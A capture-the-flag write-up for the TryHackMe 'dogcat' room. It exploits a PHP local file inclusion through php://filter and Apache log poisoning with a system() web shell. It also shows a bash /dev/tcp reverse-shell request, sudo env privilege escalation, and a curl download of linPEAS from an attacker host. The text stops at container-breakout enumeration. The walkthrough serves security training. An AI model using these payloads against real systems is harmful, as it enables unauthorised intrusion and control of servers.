# dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

---

I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!\
This machine may take a few minutes to fully start up.

[Link](https://tryhackme.com/room/dogcat) to the room

---

Let's start with a version and script scan against the target machine
```
$ sudo nmap -sV -sC <machine_ip> -Pn -n --disable-arp-ping

<...snip...>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/009bc8a6-b486-4d12-9bd3-484bdc1a8172)

The web app is about images of cats and dogs, no surprise. Let's fuzz for hidden content.
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<machine_ip>/FUZZ"

<...snip...>
cats                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
dogs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 99ms]
```

We assume that these folders contain the content of the web app (images of cats and dogs).
But we don't have permissions to access them.

Let's try making use of the first flag's hint: *There's more to *view* than just cats and dogs...*.\
Notice that view is the name of the query argument when calling the api for a random cat/dog image.
We can try and fuzz to discover more values that are accepted by that argument:
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<machine_ip>/?view=FUZZ" -fs 455

<...snip...>
category                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 39ms]
<...snip...>
```

The command returns many entries. Note that `-fs 455` is used to exclude entries that return the standard response of "Sorry, only dogs or cats are allowed".

Navigating to `http://<machine_ip>/?view=catalog`, we get the following:
![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/70e44b57-bf4b-45cd-a15e-889d8d9d2e49)

Allright, now we know that the value of `view` is attached to ".php" extension and then passed to the `include` function.\
Since this is the case, we can use a php filter to disclose the source code of php files in the server. But first, lets see what php files do we have there:
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt:FUZZ -u "http://<machine_ip>/FUZZ" -e .php

<...snip...>
flag.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
<...snip...>
```

Interestingly, we found a flag file. Now we can use the read filter to get its content encoded in base64.\
When testing the payload, I was getting the "Sorry, only dogs or cats are allowed" error, so I tried many assumptions on how the app is verifying this conditions.
One of them, which later succeeded, is that the app checks if the value of the path contains "cat" or "dog".\
Hence, to get the flag, we pass the value `http://<machine_ip>/?view=php://filter/read=convert.base64-encode/resource=cats/../flag`. We used "cats" because this is an existing folder on the server, and from which we know the relative location of "flag.php".

We decode the base64 string and get our first flag.

Having access to php files on the server, we need to figure out how to get more access.\
Let's get the index file (same directory as flag.php) and see how the app actually works.
```PHP
<...snip...>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
<...snip...>
```
First, we now validate how the app decides when a value of *view* is valid. And second, the url argument *ext* is used to specify the extension of the file to include and thus, we can now include whatever file (according to permissions) on the server.

One common method to exploit LFI vulnerabilities is log poisonning. For this, we poison our user-agent to acheive RCE when we include the log file.\

- Log file location : `/var/log/apache2/access.log`
- User Agent : `<h1><?php system($_GET['cmd']); ?></h1>`
- Result when visiting `http://<machine_ip>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=id`
![Screenshot_2023-12-08_20_29_42](https://github.com/elomarii/CTF_4_DAY/assets/106914699/62233aba-1ee3-4977-9435-09672e19054a)


Now that we can execute commands on the target machine, let's first get a reverse shell.\
We can use Burpsuite to manipulate the http request, the crafted request I used is the following, where the bash command used is `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'`. Don't forget to started a listener on your machine before sending the request.
```http
GET /?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/<rhost>/<rport>+<%261' HTTP/1.1
Host: <machine_ip>
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: nothing
Connection: close
Cache-Control: max-age=0
```

We find the second flag on the parent folder of where the app lives (execute command `ls ..`).

For our next flag, we can try and see if `www-data` (our user) can execute any commands as root with no password. And bang, yes we can:
```
www-data@e43f08c3313d:/var/www/html$ sudo -l

Matching Defaults entries for www-data on e43f08c3313d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on e43f08c3313d:
    (root) NOPASSWD: /usr/bin/env
```

We can use `env` to execute commands as root. As a consequence, we enumerate the content of `/root` and find the third flag.
```
www-data@e43f08c3313d:/var/www/html$ sudo env cat /root/flag3.txt
```

As for the last flag, and with respect to the room description, we need to beak out of the docker container running the web app.

The container doesn't appear to have internet connectivity so that we can download files directly and even available commands and binaries are very limited. Thus, to upload our `linPEAS.sh`, 1- we start an http server on the attack machine and 2- we make sure the file is accessible by the server, and finally we use `curl` (luckiliy available on the target machine) to download the script.
```
attacker@kali:/$ mkdir http; cp linPEAS.sh http/; cd http

attacker@kali:/http$ sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
<machine_ip> - - [29/Feb/2024 13:50:57] "GET /linPEAS.sh HTTP/1.1" 200 -
```
```
www-data@e43f08c3313d:/var/www/html$ curl http://<rhost>/linPEAS.sh > linPEAS.sh

www-data@e43f08c3313d:/var/www/html$ chmod +x linPEAS.sh

www-data@e43f08c3313d:/var/www/html$ ./linPEAS.sh

<...snip...>
╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout            
═╣ Container ID ................... e43f08c3313d═╣ Container Full ID .............. e43f08c3313d3b59dfd6c9b78b723515a60cc9cf08536b6330fcfa6a8fe9b22e
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
═╣ Vulnerable to CVE-2019-5021 .... No
                                                                                              
══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts                                                    
═╣ /proc mounted? ................. No                                                        
═╣ /dev mounted? .................. No                                                        
═╣ Run unshare .................... No                                                        
═╣ release_agent breakout 1........ Yes                                                       
═╣ release_agent breakout 2........ No
═╣ core_pattern breakout .......... No                                                        
═╣ binfmt_misc breakout ........... No                                                        
═╣ uevent_helper breakout ......... No                                                        
═╣ is modprobe present ............ No                                                        
═╣ DoS via panic_on_oom ........... No                                                        
═╣ DoS via panic_sys_fs ........... No                                                        
═╣ DoS via sysreq_trigger_dos ..... No                                                        
═╣ /proc/config.gz readable ....... No                                                        
═╣ /proc/sched_debug readable ..... Yes                                                       
═╣ /proc/*/mountinfo readable ..... Yes
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No
<...snip...>
```





